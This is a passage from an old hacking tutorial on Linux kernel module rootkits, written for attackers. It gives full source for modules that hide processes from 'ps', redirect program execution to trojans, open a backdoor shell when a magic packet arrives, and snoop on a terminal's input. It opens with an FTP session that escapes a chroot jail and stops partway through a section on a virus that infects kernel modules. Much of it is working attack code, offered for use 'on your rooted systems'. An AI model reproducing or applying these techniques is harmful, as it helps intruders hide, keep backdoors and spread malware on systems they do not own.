                                                                                                                                                    drwxr-xr-x  5 user              users                  1024 Jun 21 21:26 ..
                                                                                                                                                    d--x--x--x  2 root              root                   1024 Jun 21 11:26 bin
                                                                                                                                                    drwxr-xr-x  2 root              root                   1024 Jun 21 11:26 etc
                                                                                                                                                    drwxr-xr-x  2 user              users                  1024 Jun 21 11:26 home
                                                                                                                                                    226 Transfer complete.
                                                                                                                                                    ftp> ls bin/ls
                                                                                                                                                    200 PORT command successful.
                                                                                                                                                    150 Opening ASCII mode data connection for /bin/ls.
                                                                                                                                                    ---x--x--x  1 root              root                   138008 Jun 21 11:26 bin/ls
                                                                                                                                                    226 Transfer complete.
                                                                                                                                                    ftp> ren bin bin.old
                                                                                                                                                    350 File exists, ready for destination name
                                                                                                                                                    250 RNTO command successful.
                                                                                                                                                    ftp> mkdir bin
                                                                                                                                                    257 MKD command successful.
                                                                                                                                                    ftp> cd bin
                                                                                                                                                    250 CWD command successful.
                                                                                                                                                    ftp> put ls
                                                                                                                                                    226 Transfer complete.
                                                                                                                                                    ftp> put insmod
                                                                                                                                                    226 Transfer complete.
                                                                                                                                                    ftp> put chr.o
                                                                                                                                                    226 Transfer complete.
                                                                                                                                                    ftp> chmod 555 ls
                                                                                                                                                    200 CHMOD command successful.
                                                                                                                                                    ftp> chmod 555 insmod
                                                                                                                                                    200 CHMOD command successful.
                                                                                                                                                    ftp> ls
                                                                                                                                                    200 PORT command successful.
                                                                                                                                                    150 Opening ASCII mode data connection for /bin/ls.
                                                                                                                                                    UID: 0 EUID: 1002
                                                                                                                                                    Cambiando EUID...
                                                                                                                                                    UID: 0 EUID: 0
                                                                                                                                                    Cargando modulo chroot...
                                                                                                                                                    Modulo cargado.
                                                                                                                                                    226 Transfer complete.
                                                                                                                                                    ftp> bye
                                                                                                                                                    221 Goodbye.
                                                                                                                                                    thx:~#

                                                                                                                                                    --> now we start a new FTP session without being restricted (LKM is loaded so
                                                                                                                                                    sys_chroot(...) is defeated. So do what you want (download passwd...)
                                                                                                                                                </xmp>
                                                                                                                                                    In the Appendix you will find the complete source code for the new ls and the
                                                                                                                                                    module.<br>

                                                                                                                                                    <H3><A NAME="II.5."></A>5. Process related Hacks</h3>

                                                                                                                                                    So far the filesystem is totally controlled by us.  We discussed the most
                                                                                                                                                    interesting 'Hacks'. Now its time to change the direction. We need to discuss
                                                                                                                                                    LKMs confusing commands like 'ps' showing processes.

                                                                                                                                                    <H4><A NAME="II.5.1."></A>5.1 How to hide any process</h4>

                                                                                                                                                    The most important thing we need everyday is hiding a process from the admin.
                                                                                                                                                    Imagine a sniffer, cracker (should normally not be done on hacked systems), ...
                                                                                                                                                    seen by an admin when using 'ps'. Oldschool tricks like changing the name of the
                                                                                                                                                    sniffer to something different, and hoping the admin is silly enough, are no good
                                                                                                                                                    for the 21. century. We want to hide the process totally. So lets look at an
                                                                                                                                                    implementation from plaguez (some very minor changes):

                                                                                                                                                    <xmp>
                                                                                                                                                        #define MODULE
                                                                                                                                                        #define __KERNEL__

                                                                                                                                                        #include <linux/module.h>
                                                                                                                                                        #include <linux/kernel.h>
                                                                                                                                                        #include <asm/unistd.h>
                                                                                                                                                        #include <sys/syscall.h>
                                                                                                                                                        #include <sys/types.h>
                                                                                                                                                        #include <asm/fcntl.h>
                                                                                                                                                        #include <asm/errno.h>
                                                                                                                                                        #include <linux/types.h>
                                                                                                                                                        #include <linux/dirent.h>
                                                                                                                                                        #include <sys/mman.h>
                                                                                                                                                        #include <linux/string.h>
                                                                                                                                                        #include <linux/fs.h>
                                                                                                                                                        #include <linux/malloc.h>
                                                                                                                                                        #include <linux/proc_fs.h>

                                                                                                                                                        extern void* sys_call_table[];

                                                                                                                                                        /*process name we want to hide*/
                                                                                                                                                        char mtroj[] = "my_evil_sniffer";

                                                                                                                                                        int (*orig_getdents)(unsigned int fd, struct dirent *dirp, unsigned int count);

                                                                                                                                                        /*convert a string to number*/
                                                                                                                                                        int myatoi(char *str)
                                                                                                                                                        {
                                                                                                                                                            int res = 0;
                                                                                                                                                            int mul = 1;
                                                                                                                                                            char *ptr;
                                                                                                                                                            for (ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
                                                                                                                                                            if (*ptr < '0' || *ptr > '9')
                                                                                                                                                            return (-1);
                                                                                                                                                            res += (*ptr - '0') * mul;
                                                                                                                                                            mul *= 10;
                                                                                                                                                        }
                                                                                                                                                            return (res);
                                                                                                                                                        }

                                                                                                                                                        /*get task structure from PID*/
                                                                                                                                                        struct task_struct *get_task(pid_t pid)
                                                                                                                                                        {
                                                                                                                                                            struct task_struct *p = current;
                                                                                                                                                            do {
                                                                                                                                                            if (p->pid == pid)
                                                                                                                                                            return p;
                                                                                                                                                            p = p->next_task;
                                                                                                                                                        }
                                                                                                                                                            while (p != current);
                                                                                                                                                            return NULL;
                                                                                                                                                        }

                                                                                                                                                        /*get process name from task structure*/
                                                                                                                                                        static inline char *task_name(struct task_struct *p, char *buf)
                                                                                                                                                        {
                                                                                                                                                            int i;
                                                                                                                                                            char *name;

                                                                                                                                                            name = p->comm;
                                                                                                                                                            i = sizeof(p->comm);
                                                                                                                                                            do {
                                                                                                                                                            unsigned char c = *name;
                                                                                                                                                            name++;
                                                                                                                                                            i--;
                                                                                                                                                            *buf = c;
                                                                                                                                                            if (!c)
                                                                                                                                                            break;
                                                                                                                                                            if (c == '\\') {
                                                                                                                                                            buf[1] = c;
                                                                                                                                                            buf += 2;
                                                                                                                                                            continue;
                                                                                                                                                        }
                                                                                                                                                            if (c == '\n') {
                                                                                                                                                            buf[0] = '\\';
                                                                                                                                                            buf[1] = 'n';
                                                                                                                                                            buf += 2;
                                                                                                                                                            continue;
                                                                                                                                                        }
                                                                                                                                                            buf++;
                                                                                                                                                        }
                                                                                                                                                            while (i);
                                                                                                                                                            *buf = '\n';
                                                                                                                                                            return buf + 1;
                                                                                                                                                        }

                                                                                                                                                        /*check whether we need to hide this process*/
                                                                                                                                                        int invisible(pid_t pid)
                                                                                                                                                        {
                                                                                                                                                            struct task_struct *task = get_task(pid);
                                                                                                                                                            char *buffer;
                                                                                                                                                            if (task) {
                                                                                                                                                            buffer = kmalloc(200, GFP_KERNEL);
                                                                                                                                                            memset(buffer, 0, 200);
                                                                                                                                                            task_name(task, buffer);
                                                                                                                                                            if (strstr(buffer, (char *) &mtroj)) {
                                                                                                                                                            kfree(buffer);
                                                                                                                                                            return 1;
                                                                                                                                                        }
                                                                                                                                                        }
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                        /*see II.4 for more information on filesystem hacks*/
                                                                                                                                                        int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)
                                                                                                                                                        {
                                                                                                                                                            unsigned int tmp, n;
                                                                                                                                                            int t, proc = 0;
                                                                                                                                                            struct inode *dinode;
                                                                                                                                                            struct dirent *dirp2, *dirp3;

                                                                                                                                                            tmp = (*orig_getdents) (fd, dirp, count);

                                                                                                                                                            #ifdef __LINUX_DCACHE_H
                                                                                                                                                            dinode = current->files->fd[fd]->f_dentry->d_inode;
                                                                                                                                                            #else
                                                                                                                                                            dinode = current->files->fd[fd]->f_inode;
                                                                                                                                                            #endif

                                                                                                                                                            if (dinode->i_ino == PROC_ROOT_INO && !MAJOR(dinode->i_dev) && MINOR(dinode->i_dev) == 1)
                                                                                                                                                            proc=1;
                                                                                                                                                            if (tmp > 0) {
                                                                                                                                                            dirp2 = (struct dirent *) kmalloc(tmp, GFP_KERNEL);
                                                                                                                                                            memcpy_fromfs(dirp2, dirp, tmp);
                                                                                                                                                            dirp3 = dirp2;
                                                                                                                                                            t = tmp;
                                                                                                                                                            while (t > 0) {
                                                                                                                                                            n = dirp3->d_reclen;
                                                                                                                                                            t -= n;
                                                                                                                                                            if ((proc && invisible(myatoi(dirp3->d_name)))) {
                                                                                                                                                            if (t != 0)
                                                                                                                                                            memmove(dirp3, (char *) dirp3 + dirp3->d_reclen, t);
                                                                                                                                                            else
                                                                                                                                                            dirp3->d_off = 1024;
                                                                                                                                                            tmp -= n;
                                                                                                                                                        }
                                                                                                                                                            if (t != 0)
                                                                                                                                                            dirp3 = (struct dirent *) ((char *) dirp3 + dirp3->d_reclen);
                                                                                                                                                        }
                                                                                                                                                            memcpy_tofs(dirp, dirp2, tmp);
                                                                                                                                                            kfree(dirp2);
                                                                                                                                                        }
                                                                                                                                                            return tmp;
                                                                                                                                                        }


                                                                                                                                                        int init_module(void)                /*module setup*/
                                                                                                                                                        {
                                                                                                                                                            orig_getdents=sys_call_table[SYS_getdents];
                                                                                                                                                            sys_call_table[SYS_getdents]=hacked_getdents;
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                        void cleanup_module(void)            /*module shutdown*/
                                                                                                                                                        {
                                                                                                                                                            sys_call_table[SYS_getdents]=orig_getdents;
                                                                                                                                                        }
                                                                                                                                                    </xmp>

                                                                                                                                                    The code seems complicated, but if you know how 'ps' and every process analyzing
                                                                                                                                                    tool works, it is really easy to understand. Commands like 'ps' do not use any
                                                                                                                                                    special systemcall for getting a list of the current processes (there exists no
                                                                                                                                                    systemcall doing this). By strace'in 'ps' you will recognize that it gets its
                                                                                                                                                    information from the /proc/ directory. There you can find lots of directories
                                                                                                                                                    with names only consisting of numbers. Those numbers are the PIDs of all running
                                                                                                                                                    processes on that system. Inside these directories you find files which provide
                                                                                                                                                    any information on that process.So 'ps' just does an 'ls' on /proc/; every number
                                                                                                                                                    it finds stands for a PID it shows in its well-known listing. The information it
                                                                                                                                                    shows us about every process is gained from reading the files inside /proc/PID/.
                                                                                                                                                    Now you should get the idea.'ps' must read the contents of the /proc/ directory,
                                                                                                                                                    so it must use sys_getdents(...).We just must get the name of the a PID found in
                                                                                                                                                    /proc/; if it is our process name  we want to hide, we will  hide it from /proc/
                                                                                                                                                    (like we did with other files in the filesystem -> see 4.1). The two task
                                                                                                                                                    functions and the invisible(...) function are only used to get the name for a
                                                                                                                                                    given PID found in the proc directory and related stuff. The file hiding should
                                                                                                                                                    be clear after studying 4.1.<br>
                                                                                                                                                    I would improve only one point in plaguez approuch. I don't know why he used
                                                                                                                                                    a selfmade atoi-function, simple_strtoul(...) would be the easier way, but these
                                                                                                                                                    are peanuts. Of course, in a complete hide module you would put file and process
                                                                                                                                                    hiding in one hacked getdents call (this is the way plaguez did it).<br>
                                                                                                                                                    Runar Jensen used another, more complicated way. He also hides the PIDs from the
                                                                                                                                                    /proc directory, but the way he checks whether to hide or not is a bit different.
                                                                                                                                                    He uses the flags field in the task structure. This unsigned long field normally
                                                                                                                                                    uses the following constants to save some information on the task :<br>
                                                                                                                                                    <ul>
                                                                                                                                                        <li>PF_PTRACED   :  current process is observed<br>
                                                                                                                                                            <li>PF_TRACESYS  :  "       "       "  "<br>
                                                                                                                                                                <li>PF_STARTING  :  process is going to start<br>
                                                                                                                                                                    <li>PF_EXITING   :  process is going to terminate<br>
                                                                                                                                                    </ul>
                                                                                                                                                    Now Runar Jensen adds his own constant (PF_INVISIBLE) which he uses to indicate
                                                                                                                                                    that the corresponding process should be invisible. So a PID found in /proc by
                                                                                                                                                    using sys_getdents(...) must not be resolved in its name. You only have to check
                                                                                                                                                    for the task flag field. This sounds easier than the 'name approach'. But how to
                                                                                                                                                    set this flag for a process we want to hide. Runar Jensen used the easiest way
                                                                                                                                                    by hooking sys_kill(...). The 'kill' command can send a special code (9 for
                                                                                                                                                    termination, for example) to any process speciafied by his PID. So start your
                                                                                                                                                    process which is going to be invisible, do a 'ps' for getting its PID. And use
                                                                                                                                                    a 'kill -code PID'. The code field must be a value that is not used by the
                                                                                                                                                    system (so 9 would be a bad choice); Runar Jensen took 32. So the module needs
                                                                                                                                                    to hook sys_kill(...) and check for a code of 32. If so it must set the task
                                                                                                                                                    flags field of the process specified through the PID given to sys_kill(...).
                                                                                                                                                    This is a way to set the flag field. Now it is clear why this approach is a bit
                                                                                                                                                    too complicated for an easy practical use.

                                                                                                                                                    <H4><A NAME="II.5.2."></A>5.2 How to redirect Execution of files</h4>

                                                                                                                                                    In certain situations it could be very interesting to redirect the execution
                                                                                                                                                    of a file. Those files could be /bin/login (like plaguez did), tcpd, etc.. This
                                                                                                                                                    would allow you to insert any trojan without problem of checksum checks on those
                                                                                                                                                    files (you don't need to change them). So let's again search the responsible
                                                                                                                                                    systemcall. sys_execve(...) is the one we need. Let's take a look at plaguez
                                                                                                                                                    way of redirection (the original idea came from  halflife) :<br>

                                                                                                                                                    <xmp>
                                                                                                                                                        #define MODULE
                                                                                                                                                        #define __KERNEL__

                                                                                                                                                        #include <linux/module.h>
                                                                                                                                                        #include <linux/kernel.h>
                                                                                                                                                        #include <asm/unistd.h>
                                                                                                                                                        #include <sys/syscall.h>
                                                                                                                                                        #include <sys/types.h>
                                                                                                                                                        #include <asm/fcntl.h>
                                                                                                                                                        #include <asm/errno.h>
                                                                                                                                                        #include <linux/types.h>
                                                                                                                                                        #include <linux/dirent.h>
                                                                                                                                                        #include <sys/mman.h>
                                                                                                                                                        #include <linux/string.h>
                                                                                                                                                        #include <linux/fs.h>
                                                                                                                                                        #include <linux/malloc.h>

                                                                                                                                                        extern void* sys_call_table[];

                                                                                                                                                        /*must be defined because of syscall macro used below*/
                                                                                                                                                        int errno;

                                                                                                                                                        /*we define our own systemcall*/
                                                                                                                                                        int __NR_myexecve;

                                                                                                                                                        /*we must use brk*/
                                                                                                                                                        static inline _syscall1(int, brk, void *, end_data_segment);

                                                                                                                                                        int (*orig_execve) (const char *, const char *[], const char *[]);

                                                                                                                                                        /*here plaguez's user -> kernel space transition specialized for strings
                                                                                                                                                        is better than memcpy_fromfs(...)*/
                                                                                                                                                        char *strncpy_fromfs(char *dest, const char *src, int n)
                                                                                                                                                        {
                                                                                                                                                            char *tmp = src;
                                                                                                                                                            int compt = 0;

                                                                                                                                                            do {
                                                                                                                                                            dest[compt++] = __get_user(tmp++, 1);
                                                                                                                                                        }
                                                                                                                                                            while ((dest[compt - 1] != '\0') && (compt != n));
                                                                                                                                                            return dest;
                                                                                                                                                        }


                                                                                                                                                        /*this is something like a systemcall macro called with SYS_execve, the
                                                                                                                                                        asm code calls int 0x80 with the registers set in a way needed for our own
                                                                                                                                                        __NR_myexecve systemcall*/
                                                                                                                                                        int my_execve(const char *filename, const char *argv[], const char *envp[])
                                                                                                                                                        {
                                                                                                                                                            long __res;
                                                                                                                                                            __asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_myexecve), "b"((long)
                                                                                                                                                            (filename)), "c"((long) (argv)),                      "d"((long) (envp)));
                                                                                                                                                            return (int) __res;
                                                                                                                                                        }


                                                                                                                                                        int hacked_execve(const char *filename, const char *argv[], const char *envp[])
                                                                                                                                                        {
                                                                                                                                                            char *test;
                                                                                                                                                            int ret, tmp;
                                                                                                                                                            char *truc = "/bin/ls";        /*the file we *should* be executed*/
                                                                                                                                                            char *nouveau = "/bin/ps";     /*the new file which *will* be executed*/
                                                                                                                                                            unsigned long mmm;

                                                                                                                                                            test = (char *) kmalloc(strlen(truc) + 2, GFP_KERNEL);
                                                                                                                                                            /*get file which a user wants to execute*/
                                                                                                                                                            (void) strncpy_fromfs(test, filename, strlen(truc));
                                                                                                                                                            test[strlen(truc)] = '\0';
                                                                                                                                                            /*do we have our truc file ?*/
                                                                                                                                                            if (!strcmp(test, truc))
                                                                                                                                                        {
                                                                                                                                                            kfree(test);
                                                                                                                                                            mmm = current->mm->brk;
                                                                                                                                                            ret = brk((void *) (mmm + 256));
                                                                                                                                                            if (ret < 0)
                                                                                                                                                            return ret;
                                                                                                                                                            /*set new program name (the program we want to execute instead of /bin/ls or
  whatever)*/
                                                                                                                                                            memcpy_tofs((void *) (mmm + 2), nouveau, strlen(nouveau) + 1);
                                                                                                                                                            /*execute it with the *same* arguments / environment*/
                                                                                                                                                            ret = my_execve((char *) (mmm + 2), argv, envp);
                                                                                                                                                            tmp = brk((void *) mmm);
                                                                                                                                                        } else {
                                                                                                                                                            kfree(test);
                                                                                                                                                            /*no the program was not /bin/ls so execute it the normal way*/
                                                                                                                                                            ret = my_execve(filename, argv, envp);
                                                                                                                                                        }
                                                                                                                                                            return ret;
                                                                                                                                                        }

                                                                                                                                                        int init_module(void)                /*module setup*/
                                                                                                                                                        {
                                                                                                                                                            /*the following lines choose the systemcall number of our new myexecve*/
                                                                                                                                                            __NR_myexecve = 200;
                                                                                                                                                            while (__NR_myexecve != 0 && sys_call_table[__NR_myexecve] != 0)
                                                                                                                                                            __NR_myexecve--;

                                                                                                                                                            orig_execve = sys_call_table[SYS_execve];
                                                                                                                                                            if (__NR_myexecve != 0)
                                                                                                                                                        {
                                                                                                                                                            sys_call_table[__NR_myexecve] = orig_execve;
                                                                                                                                                            sys_call_table[SYS_execve] = (void *) hacked_execve;
                                                                                                                                                        }
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                        void cleanup_module(void)            /*module shutdown*/
                                                                                                                                                        {
                                                                                                                                                            sys_call_table[SYS_execve]=orig_execve;
                                                                                                                                                        }
                                                                                                                                                    </xmp>

                                                                                                                                                    When you loaded this module, every call to /bin/ls will just execute /bin/ps.
                                                                                                                                                    The following list gives you some ideas how to use this redirection of execve :
                                                                                                                                                    <ul>
                                                                                                                                                        <li>trojan /bin/login with a hacker login (how plaguez suggests)<br>
                                                                                                                                                            <li>trojan tcpd to open a rootshell on a certain port, or to filter its logging
                                                                                                                                                                behaviour (remember CERT advisory on a trojan TCPD version)<br>
                                                                                                                                                                    <li>trojan inetd for a root shell<br>
                                                                                                                                                                        <li>trojan httpd, sendmail, ... any server you can think of, for a rootshell, by
                                                                                                                                                                            issuing a special magic string<br>
                                                                                                                                                                                <li>trojan tools like tripwire, L6<br>
                                                                                                                                                                                    <li>other system security relevant tools<br>
                                                                                                                                                    </ul>
                                                                                                                                                    There are thousands of other intersting programs to 'trojan', just use your
                                                                                                                                                    brain.

                                                                                                                                                    <H3><A NAME="II.6."></A>6.  Network (Socket) related Hacks</h3>

                                                                                                                                                    The network is the hacker's playground. So let's look at something which can
                                                                                                                                                    help us.

                                                                                                                                                    <H4><A NAME="II.6.1."></A>6.1 How to controll Socket Operations</h4>

                                                                                                                                                    There are many things you can do by controlling Socket Operations. plaguez gave
                                                                                                                                                    us a nice backdoor. He just intercepts the sys_socketcall systemcall, waiting
                                                                                                                                                    for a packet with a certain length and a certain contents. So let's take a look
                                                                                                                                                    at his hacked systemcall (I will only show the hacked_systemcall, because the
                                                                                                                                                    rest is equal to every other LKM mentioned in this section) :

                                                                                                                                                    <xmp>
                                                                                                                                                        int hacked_socketcall(int call, unsigned long *args)
                                                                                                                                                        {
                                                                                                                                                            int ret, ret2, compt;

                                                                                                                                                            /*our magic size*/
                                                                                                                                                            int MAGICSIZE=42;

                                                                                                                                                            /*our magic contents*/
                                                                                                                                                            char *t = "packet_contents";
                                                                                                                                                            unsigned long *sargs = args;
                                                                                                                                                            unsigned long a0, a1, mmm;
                                                                                                                                                            void *buf;

                                                                                                                                                            /*do the call*/
                                                                                                                                                            ret = (*o_socketcall) (call, args);

                                                                                                                                                            /*did we have magicsize & and a recieve ?*/
                                                                                                                                                            if (ret == MAGICSIZE && call == SYS_RECVFROM)
                                                                                                                                                        {
                                                                                                                                                            /*work on arguments*/
                                                                                                                                                            a0 = get_user(sargs);
                                                                                                                                                            a1 = get_user(sargs + 1);
                                                                                                                                                            buf = kmalloc(ret, GFP_KERNEL);
                                                                                                                                                            memcpy_fromfs(buf, (void *) a1, ret);
                                                                                                                                                            for (compt = 0; compt < ret; compt++)
                                                                                                                                                            if (((char *) (buf))[compt] == 0)
                                                                                                                                                            ((char *) (buf))[compt] = 1;
                                                                                                                                                            /*do we have magic_contents ?*/
                                                                                                                                                            if (strstr(buf, mtroj))
                                                                                                                                                        {
                                                                                                                                                            kfree(buf);
                                                                                                                                                            ret2 = fork();
                                                                                                                                                            if (ret2 == 0)
                                                                                                                                                        {
                                                                                                                                                            /*if so execute our proggy (shell or whatever you want...) */
                                                                                                                                                            mmm = current->mm->brk;
                                                                                                                                                            ret2 = brk((void *) (mmm + 256));
                                                                                                                                                            memcpy_tofs((void *) mmm + 2, (void *) t, strlen(t) + 1);

                                                                                                                                                            /*plaguez's execve implementation -> see 4.2*/
                                                                                                                                                            ret2 = my_execve((char *) mmm + 2, NULL, NULL);
                                                                                                                                                        }
                                                                                                                                                        }
                                                                                                                                                        }
                                                                                                                                                            return ret;
                                                                                                                                                        }
                                                                                                                                                    </xmp>

                                                                                                                                                    Ok, as always I added some comments to the code, which is a bit ugly, but working.
                                                                                                                                                    The code intercepts every sys_socketcall (which is responsible for everything
                                                                                                                                                    concerning socket-operations see I.2). Inside the hacked systemcall the code
                                                                                                                                                    first issues a normal systemcall. After that the return value and call variables
                                                                                                                                                    are checked. If it was a receive Socketcall and the 'packetsize' (...nothing to
                                                                                                                                                    do with TCP/IP packets...) is ok it will check the contents which was received.
                                                                                                                                                    If it can find our magic contents, the code can be sure,that we (hacker) want to
                                                                                                                                                    start the backdoor program. This is done by my_execve(...).<br>
                                                                                                                                                    In my opinion this approach is very good, it would also be possible to wait
                                                                                                                                                    for a speciel connect / close pattern, just be creative.<br>
                                                                                                                                                    Please remember that the methods mentioned above need a service listing on a
                                                                                                                                                    certain port, because the receive function is only issued by daemons receiving
                                                                                                                                                    data from an established connection. This is a disadvantage, because it could be
                                                                                                                                                    a bit suspect for some paranoid admins out there. Test those backdoor LKM ideas
                                                                                                                                                    first on your system to see what will happen. Find your favourite way of
                                                                                                                                                    backdoor'ing the sys_socketcall, and use it on your rooted systems.

                                                                                                                                                    <H3><A NAME="II.7."></A>7. Ways to TTY Hijacking</h3>

                                                                                                                                                    TTY hijacking is very interesting and also something used since a very very long
                                                                                                                                                    time. We can grab every input from a TTY we specify throug its major and minor
                                                                                                                                                    number. In Phrack 50 halflife published a really good LKM doing this. The
                                                                                                                                                    following code is ripped from his LKM. It should show every beginner the basics
                                                                                                                                                    of TTY hijacking though its no complete implementation, you cannot use it in any
                                                                                                                                                    useful way, because I did <i>not</i> implement a way of logging the TTY input made
                                                                                                                                                    by the user. It's just for those of you who want to understand the basics, so
                                                                                                                                                    here we go :

                                                                                                                                                    <xmp>
                                                                                                                                                        #define MODULE
                                                                                                                                                        #define __KERNEL__
                                                                                                                                                        #include <linux/module.h>
                                                                                                                                                        #include <linux/kernel.h>
                                                                                                                                                        #include <asm/unistd.h>
                                                                                                                                                        #include <sys/syscall.h>
                                                                                                                                                        #include <sys/types.h>
                                                                                                                                                        #include <asm/fcntl.h>
                                                                                                                                                        #include <asm/errno.h>
                                                                                                                                                        #include <linux/types.h>
                                                                                                                                                        #include <linux/dirent.h>
                                                                                                                                                        #include <sys/mman.h>
                                                                                                                                                        #include <linux/string.h>
                                                                                                                                                        #include <linux/fs.h>
                                                                                                                                                        #include <linux/malloc.h>
                                                                                                                                                        #include <asm/io.h>
                                                                                                                                                        #include <sys/sysmacros.h>


                                                                                                                                                        int errno;

                                                                                                                                                        /*the TTY we want to hijack*/
                                                                                                                                                        int tty_minor = 2;
                                                                                                                                                        int tty_major = 4;

                                                                                                                                                        extern void* sys_call_table[];

                                                                                                                                                        /*we need the write systemcall*/
                                                                                                                                                        static inline _syscall3(int, write, int, fd, char *, buf, size_t, count);

                                                                                                                                                        void *original_write;

                                                                                                                                                        /* check if it is the tty we are looking for */
                                                                                                                                                        int is_fd_tty(int fd)
                                                                                                                                                        {
                                                                                                                                                            struct file *f=NULL;
                                                                                                                                                            struct inode *inode=NULL;
                                                                                                                                                            int mymajor=0;
                                                                                                                                                            int myminor=0;

                                                                                                                                                            if(fd >= NR_OPEN || !(f=current->files->fd[fd]) || !(inode=f->f_inode))
                                                                                                                                                            return 0;
                                                                                                                                                            mymajor = major(inode->i_rdev);
                                                                                                                                                            myminor = minor(inode->i_rdev);
                                                                                                                                                            if(mymajor != tty_major) return 0;
                                                                                                                                                            if(myminor != tty_minor) return 0;
                                                                                                                                                            return 1;
                                                                                                                                                        }

                                                                                                                                                        /* this is the new write(2) replacement call */
                                                                                                                                                        extern int new_write(int fd, char *buf, size_t count)
                                                                                                                                                        {
                                                                                                                                                            int r;
                                                                                                                                                            char *kernel_buf;

                                                                                                                                                            if(is_fd_tty(fd))
                                                                                                                                                        {
                                                                                                                                                            kernel_buf = (char*) kmalloc(count+1, GFP_KERNEL);
                                                                                                                                                            memcpy_fromfs(kernel_buf, buf, count);

                                                                                                                                                            /*at this point you can output buf whereever you want, it represents
  every input on the TTY device referenced by the chosen major / minor
  number
  I did not implement such a routine, because you will see a complete &
  very good TTY hijacking tool by halflife in appendix A */

                                                                                                                                                            kfree(kernel_buf);
                                                                                                                                                        }
                                                                                                                                                            sys_call_table[SYS_write] = original_write;
                                                                                                                                                            r = write(fd, buf, count);
                                                                                                                                                            sys_call_table[SYS_write] = new_write;
                                                                                                                                                            if(r == -1) return -errno;
                                                                                                                                                            else return r;
                                                                                                                                                        }

                                                                                                                                                        int init_module(void)
                                                                                                                                                        {
                                                                                                                                                            /*you should know / understand this...*/
                                                                                                                                                            original_write = sys_call_table[SYS_write];
                                                                                                                                                            sys_call_table[SYS_write] = new_write;
                                                                                                                                                            return 0;
                                                                                                                                                        }


                                                                                                                                                        void cleanup_module(void)
                                                                                                                                                        {
                                                                                                                                                            /*no more hijacking*/
                                                                                                                                                            sys_call_table[SYS_write] = original_write;
                                                                                                                                                        }
                                                                                                                                                    </xmp>


                                                                                                                                                    The comments should make this code easy to read.The general idea is to intercept
                                                                                                                                                    sys_write (see 4.2) and filtering the fd value as I mentioned in 4.2. After
                                                                                                                                                    checking fd for the TTY we want to snoop, get the data written and write it
                                                                                                                                                    to some log (not implemented in the example above).There are several ways where
                                                                                                                                                    you can store the logs.halflife used a buffer (accessible through an own device)
                                                                                                                                                    which is a good idea (he can also control his hijack'er using ioctl-commands
                                                                                                                                                    on his device).<br>
                                                                                                                                                    I personally would recommand storing the logs in hidden (through LKM) file,
                                                                                                                                                    and making the controlling through some kind of IPC. Take the way which works
                                                                                                                                                    on your rooted system.<br>

                                                                                                                                                    <H3><A NAME="II.8."></A>8. Virus writing with LKMs</h3>

                                                                                                                                                    Now we will leave the hacking part for a second and take a look at the
                                                                                                                                                    world of virus coding (the ideas discussed here could also be
                                                                                                                                                    interesting for hackers, so read on...). I will concentrate this discussion
                                                                                                                                                    on the LKM infector made by Stealthf0rk/SVAT. In appendix A you will get the
                                                                                                                                                    complete source, so this section will only discuss important techniques and
                                                                                                                                                    functions. This LKM requires a Linux system (it was tested on a 2.0.33 system)
                                                                                                                                                    and kerneld installed (I will explain why).<br>
                                                                                                                                                    First of all you have to know that this LKM infector does not infect normal
                                                                                                                                                    elf <i>executables</i> (would also be possible,I will come to that point later->7.1),
                                                                                                                                                    it only infects <i>modules</i>, which are loaded / unloaded. This loading / unloading
                                                                                                                                                    is often managed by kerneld (see I.7). So imagine a module infected with the
                                                                                                                                                    virus code; when loading this module you also load the virus LKM which uses
                                                                                                                                                    hiding features (see 8). This virus module intercepts the sys_create_module
                                                                                                                                                    and sys_delete_module (see I.2) systemcalls for further infection. Whenever
                                                                                                                                                    a module is unloaded on that system it is infected by the new sys_delete_module
                                                                                                                                                    systemcall. So every module requested by kerneld (or manually) will be infected
                                                                                                                                                    when unloaded.<br>
                                                                                                                                                    You could imagine the following scenario for the first infection :
                                                                                                                                                    <ul>
                                                                                                                                                        <li>admin is searching a network driver for his new interface card (ethernet,...)<br>
                                                                                                                                                            <li>he starts searching the web <br>
                                                                                                                                                                <li>he finds a driver module which should work on his system & downloads it<br>
                                                                                                                                                                    <li>he installs the module on his system [the module <i>is</i> infected]<br>
                                                                                                                                                                        --> the infector is installed, the system is compromised<br>
                                                                                                                                                    </ul>
                                                                                                                                                    Of course, he did not download the source, he was lazy and took the risks using
                                                                                                                                                    a binary file. So admins <i>never</i> trust any binary files (esp. modules).
                                                                                                                                                    So I hope you see the chances / risks of LKM infectors, now let's look a bit
                                                                                                                                                    closer at the LKM infector by SVAT.<br>
                                                                                                                                                    Imagine you have the source for the virus LKM (a simple module, which intercepts
                                                                                                                                                    sys_create_module / sys_delete_module and some other [more tricky] stuff). The
                                                                                                                                                    first question would be how to infect an existing module (the host module). Well
                                                                                                                                                    let's do some experimenting. Take two modules and 'cat' them together like

                                                                                                                                                    <xmp>
                                                                                                                                                        # cat module1.o >> module2.o
                                                                                                                                                    </xmp>

                                                                                                                                                    After this try to insmod the resulting module2.o (which also includes module1.o
                                                                                                                                                    at its end).

                                                                                                                                                    <xmp>
                                                                                                                                                        # insmod module2.o
                                                                                                                                                    </xmp>

                                                                                                                                                    Ok it worked, now check which modules are loaded on your system

                                                                                                                                                    <xmp>
                                                                                                                                                        # lsmod
                                                                                                                                                        Module         Pages    Used by
                                                                                                                                                        module2        1  0
                                                                                                                                                    </xmp>

                                                                                                                                                    So we know that by concatenating two modules the first one (concerning object
                                                                                                                                                    code) will be loaded, the second one will be ignored. And there will be no error
                                                                                                                                                    saying that insmod can not load corrupted code or so.<br>
                                                                                                                                                    With this in mind, it should be clear that a host module could be infected by

                                                                                                                                                    <xmp>
                                                                                                                                                        cat host_module.o >> virus_module.o
                                                                                                                                                        ren virus_module.o host_module.o
                                                                                                                                                    </xmp>

                                                                                                                                                    This way loading host_module.o will load the virus with all its nice LKM
                                                                                                                                                    features. But there is one problem, how do we load the actual host_module ? It
                                                                                                                                                    would be very strange to a user / admin when his device driver would do nothing.
                                                                                                                                                    Here we need the help of kerneld. As I said in I.7 you can use kerneld to load
                                                                                                                                                    a module. Just use request_module("module_name") in your sources.This will force
                                                                                                                                                    kerneld to load the specified module. But where do we get the original host
                                                                                                                                                    module from ? It is packed in host_module.o (together with virus_module.o). So
